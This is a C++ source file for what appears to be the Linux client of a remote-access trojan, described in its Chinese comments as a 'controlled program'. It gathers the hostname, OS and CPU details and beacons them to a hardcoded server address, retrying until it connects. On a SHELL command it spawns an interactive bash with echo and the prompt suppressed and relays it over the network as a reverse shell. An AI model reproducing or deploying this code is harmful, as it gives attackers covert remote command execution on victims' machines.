#include "common/commands.h"
#include "client/IOCPClient.h"
#include <unistd.h>
#include <sys/utsname.h>
#include <string.h>
#include <termios.h>
#include <thread>
#include <fcntl.h>
#include <atomic>
#include <cerrno>
#include <csignal>
#include <sys/wait.h>
#include <pty.h>
#include <iostream>
#include <stdexcept>
#include <cstdio>
#include <memory>
#include <array>
#include <regex>
#include <fstream>

int DataProcess(void* user, PBYTE szBuffer, ULONG ulLength);

// 远程地址：当前为写死状态，如需调试，请按实际情况修改
CONNECT_ADDRESS g_SETTINGS = { FLAG_GHOST, "192.168.0.55", "6543", CLIENT_TYPE_LINUX };

// 全局状态
State g_bExit = S_CLIENT_NORMAL;

// 伪终端处理类：继承自IOCPManager.
class PTYHandler : public IOCPManager
{
public:
    PTYHandler(IOCPClient* client) : m_client(client), m_running(false)
    {
        if (!client) {
            throw std::invalid_argument("IOCPClient pointer cannot be null");
        }

        // 创建伪终端
        if (openpty(&m_master_fd, &m_slave_fd, nullptr, nullptr, nullptr) == -1) {
            throw std::runtime_error("Failed to create pseudo terminal");
        }

        // 设置伪终端为非阻塞模式
        int flags = fcntl(m_master_fd, F_GETFL, 0);
        fcntl(m_master_fd, F_SETFL, flags | O_NONBLOCK);

        // 启动 Shell 进程
        startShell();
    }

    ~PTYHandler()
    {
        m_running = false;
        if (m_readThread.joinable()) m_readThread.join();
        close(m_master_fd);
        close(m_slave_fd);
        if (m_child_pid > 0) {
            kill(m_child_pid, SIGTERM);
            waitpid(m_child_pid, nullptr, 0);
        }
    }

    // 启动读取线程
    void Start()
    {
        bool expected = false;
        if (!m_running.compare_exchange_strong(expected, true)) return;
        m_readThread = std::thread(&PTYHandler::readFromPTY, this);
    }

    virtual VOID OnReceive(PBYTE data, ULONG size)
    {
        if (size && data[0] == COMMAND_NEXT) {
            Start();
            return;
        }
        std::string s((char*)data, size);
        Mprintf("%s", s.c_str());
        if (size > 0) {
            ssize_t total = 0;
            while (total < (ssize_t)size) {
                ssize_t written = write(m_master_fd, (char*)data + total, size - total);
                if (written == -1) {
                    if (errno == EAGAIN || errno == EINTR) continue;
                    Mprintf("OnReceive: write error %d\n", errno);
                    break;
                }
                total += written;
            }
        }
    }
private:
    int m_master_fd, m_slave_fd;
    IOCPClient* m_client;
    std::thread m_readThread;
    std::atomic<bool> m_running;
    pid_t m_child_pid;

    void startShell()
    {
        m_child_pid = fork();
        if (m_child_pid == -1) {
            close(m_master_fd);
            close(m_slave_fd);
            throw std::runtime_error("Failed to fork shell process");
        }
        if (m_child_pid == 0) {  // 子进程
            setsid();  // 创建新的会话
            dup2(m_slave_fd, STDIN_FILENO);
            dup2(m_slave_fd, STDOUT_FILENO);
            dup2(m_slave_fd, STDERR_FILENO);
            close(m_master_fd);
            close(m_slave_fd);

            // 关闭回显、禁用 ANSI 颜色、关闭 PS1
            const char* shell_cmd =
                "stty -echo -icanon; "  // 禁用回显和规范模式
                "export TERM=dumb; "    // 设置终端类型为 dumb
                "export LS_COLORS=''; " // 禁用颜色
                "export PS1='>'; "      // 设置提示符
                //"clear; "             // 清空终端
                "exec /bin/bash --norc --noprofile -i";  // 启动 Bash
            execl("/bin/bash", "/bin/bash", "-c", shell_cmd, nullptr);
            exit(1);
        }
    }

    void readFromPTY()
    {
        char buffer[4096];
        while (m_running) {
            ssize_t bytes_read = read(m_master_fd, buffer, sizeof(buffer) - 1);
            if (bytes_read > 0) {
                if (m_client) {
                    buffer[bytes_read] = '\0';
                    Mprintf("%s", buffer);
                    m_client->Send2Server(buffer, bytes_read);
                }
            }
            else if (bytes_read == -1) {
                if (errno == EAGAIN || errno == EWOULDBLOCK) {
                    usleep(10000);
                } else {
                    Mprintf("readFromPTY: read error %d\n", errno);
                    break;
                }
            }
        }
    }
};

void* ShellworkingThread(void* param)
{
    try {
        std::unique_ptr<IOCPClient> ClientObject(new IOCPClient(g_bExit, true));
        void* clientAddr = ClientObject.get();
        Mprintf(">>> Enter ShellworkingThread [%p]\n", clientAddr);
        if (!g_bExit && ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort())) {
            std::unique_ptr<PTYHandler> handler(new PTYHandler(ClientObject.get()));
            ClientObject->setManagerCallBack(handler.get(), IOCPManager::DataProcess, IOCPManager::ReconnectProcess);
            BYTE bToken = TOKEN_SHELL_START;
            ClientObject->Send2Server((char*)&bToken, 1);
            Mprintf(">>> ShellworkingThread [%p] Send: TOKEN_SHELL_START\n", clientAddr);
            while (ClientObject->IsRunning() && ClientObject->IsConnected() && S_CLIENT_NORMAL == g_bExit)
                Sleep(1000);
        }
        Mprintf(">>> Leave ShellworkingThread [%p]\n", clientAddr);
    } catch (const std::exception& e) {
        Mprintf("*** ShellworkingThread exception: %s ***\n", e.what());
    }
    return NULL;
}

int DataProcess(void* user, PBYTE szBuffer, ULONG ulLength)
{
    if (szBuffer == nullptr || ulLength == 0)
        return TRUE;

    if (szBuffer[0] == COMMAND_BYE) {
        Mprintf("*** [%p] Received Bye-Bye command ***\n", user);
        g_bExit = S_CLIENT_EXIT;
    }
    else if (szBuffer[0] == COMMAND_SHELL) {
        std::thread(ShellworkingThread, nullptr).detach();
        Mprintf("** [%p] Received 'SHELL' command ***\n", user);
    }
    else if (szBuffer[0] == COMMAND_NEXT) {
        Mprintf("** [%p] Received 'NEXT' command ***\n", user);
    }
    else {
        Mprintf("** [%p] Received unimplemented command: %d ***\n", user, int(szBuffer[0]));
    }
    return TRUE;
}

// 方法1: 解析 lscpu 命令（优先使用）
double parse_lscpu()
{
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen("lscpu", "r"), pclose);
    if (!pipe) return -1.0;

    while (fgets(buffer.data(), buffer.size(), pipe.get())) {
        result += buffer.data();
    }

    // 匹配 "Model name" 中的频率（如 "Intel(R) Core(TM) i5-6300HQ CPU @ 2.30GHz"）
    std::regex model_regex("@ ([0-9.]+)GHz");
    std::smatch match;
    if (std::regex_search(result, match, model_regex) && match.size() > 1) {
        try {
            return std::stod(match[1].str()) * 1000; // GHz -> MHz
        } catch (...) {}
    }
    return -1;
}

// 方法2: 解析 /proc/cpuinfo（备用）
double parse_cpuinfo()
{
    std::ifstream cpuinfo("/proc/cpuinfo");
    std::string line;
    std::regex freq_regex("@ ([0-9.]+)GHz");

    while (std::getline(cpuinfo, line)) {
        if (line.find("model name") != std::string::npos) {
            std::smatch match;
            if (std::regex_search(line, match, freq_regex) && match.size() > 1) {
                try {
                    return std::stod(match[1].str()) * 1000; // GHz -> MHz
                } catch (...) {}
            }
        }
    }
    return -1;
}

// 一个基于Linux操作系统实现的受控程序例子: 当前只实现了注册、删除和终端功能.
int main()
{
    char hostname[256] = {};
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        std::cout << "Hostname: " << hostname << std::endl;
    }
    else {
        std::cerr << "Failed to get hostname" << std::endl;
    }
    struct utsname systemInfo = {};
    if (uname(&systemInfo) == 0) {
        std::cout << "System Name: " << systemInfo.sysname << std::endl;
    }
    else {
        std::cerr << "Failed to get system info" << std::endl;
    }

    LOGIN_INFOR logInfo;
    strncpy(logInfo.szPCName, hostname, sizeof(logInfo.szPCName) - 1);
    logInfo.szPCName[sizeof(logInfo.szPCName) - 1] = '\0';
    strncpy(logInfo.OsVerInfoEx, systemInfo.sysname, sizeof(logInfo.OsVerInfoEx) - 1);
    logInfo.OsVerInfoEx[sizeof(logInfo.OsVerInfoEx) - 1] = '\0';
    strncpy(logInfo.szStartTime, ToPekingTimeAsString(nullptr).c_str(), sizeof(logInfo.szStartTime) - 1);
    logInfo.szStartTime[sizeof(logInfo.szStartTime) - 1] = '\0';
    double freq = parse_lscpu(); // 优先使用 lscpu
    if (freq < 0) freq = parse_cpuinfo(); // 回退到 /proc/cpuinfo
    logInfo.dwCPUMHz = freq > 0 ? static_cast<unsigned int>(freq) : 0;
    logInfo.bWebCamIsExist = 0;
    strcpy_s(logInfo.szReserved, "LNX");

    std::unique_ptr<IOCPClient> ClientObject(new IOCPClient(g_bExit, false));
    ClientObject->setManagerCallBack(NULL, DataProcess, NULL);
    while (!g_bExit) {
        clock_t c = clock();
        if (!ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort())) {
            Sleep(5000);
            continue;
        }

        ClientObject->SendLoginInfo(logInfo.Speed(clock() - c));

        do {
            Sleep(5000);
        } while (ClientObject->IsRunning() && ClientObject->IsConnected() && S_CLIENT_NORMAL == g_bExit);
    }

    return 0;
}
